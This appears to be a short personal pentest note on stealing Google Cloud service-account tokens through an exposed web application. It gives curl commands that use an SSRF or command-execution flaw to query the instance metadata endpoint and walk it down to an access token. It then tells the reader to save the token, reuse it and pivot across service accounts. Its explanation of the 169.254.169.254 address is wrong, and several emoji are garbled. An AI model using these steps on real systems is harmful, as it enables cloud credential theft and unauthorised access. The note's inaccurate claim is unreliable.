#### üì¶ - Exposed Web Application

Any internet facing application or resource can give us information about the system (metadata).

Enumerate the resource and try to identify an exploitable input field.

-Attempt to extract access tokens from the victim:
1) In a input field vulnerable to ssrf or rce, you can inject commands that in the header will retrieve information:

```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/
```
```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/
```

```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
```

```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/[Put the service account you discovered]
```

```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
```

```
curl -H "Metadata-Flavor: Google"
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/[service account email]/token
```

==Clarification==
-The IP 169.254.169.254 is used in all cloud providers as a link local to test communication between instances.
-Here, since we can execute code on a vulnerable input field of the instance, we are making a curl call with header Google:metadata to obtain proggressively the token

2) Grab an copy the access token, save it as a txt file
3) Analyze again the roles and permissions of any new service accounts you discover.
4) If you were able to steal a token, try to authenticate with any new discovered service accounts you got.

Any new [[Google Service Accounts]] that you run into during enumeration or exploitation, check again its roles and permissions in each project. 



### Properties
---
üìÜ created   {{30-11-2024}} 13:55
üè∑Ô∏è tags: #cloud  #google 

---